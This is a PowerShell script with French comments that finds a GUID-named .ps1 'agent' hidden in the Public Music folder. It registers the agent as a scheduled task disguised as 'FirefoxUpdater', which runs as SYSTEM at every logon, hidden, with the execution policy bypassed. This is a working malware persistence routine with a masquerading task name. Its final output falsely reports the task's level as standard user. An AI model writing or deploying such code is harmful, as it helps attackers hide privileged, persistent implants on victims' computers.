
# ================================================
# CREATION TACHE PLANIFIEE - AUTO DISCOVERY
# ================================================

$BasePath = "$env:PUBLIC\Music"

# 1. Recherche du script dans les dossiers GUID
$Candidates = @(
    Get-ChildItem -Path $BasePath -Directory -ErrorAction Stop |
    Where-Object {
        $_.Name -match '^[a-fA-F0-9]{32}$'
    } |
    ForEach-Object {
        Get-ChildItem -Path $_.FullName -File -Filter "*.ps1" |
        Where-Object {
            $_.Name -match '[a-fA-F0-9]{32}\.ps1$'
        }
    }
)

# 2. Vérification
if ($Candidates.Count -eq 0) {
    throw "Aucun <GUID>.ps1 trouve dans $BasePath"
}

if ($Candidates.Count -gt 1) {
    throw "Plusieurs scripts correspondants trouves. Nettoyer les anciens dossiers avant de continuer."
}

$Agent = $Candidates[0]

Write-Host "[+] Script trouve : $($Agent.FullName)" -ForegroundColor Green

# 3. Configuration de la tâche
$CurrentUser = [Security.Principal.WindowsIdentity]::GetCurrent().Name

$TaskName = "FirefoxUpdater"

$trigger = New-ScheduledTaskTrigger -AtLogOn
$action = New-ScheduledTaskAction -Execute "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Argument ("-WindowStyle hidden -NoProfile -ExecutionPolicy Bypass -File {0}" -f $Agent.FullName)
Register-ScheduledTask -User "System" -Action $action -TaskName $TaskName -Trigger $trigger -RunLevel Highest -Force

Write-Host "`n[+] Tache creee : $TaskName" -ForegroundColor Green
Write-Host "[+] Utilisateur : $CurrentUser"
Write-Host "[+] Script : $($Agent.FullName)"
Write-Host "[+] Declencheur : ouverture de session"
Write-Host "[+] Niveau : utilisateur standard"
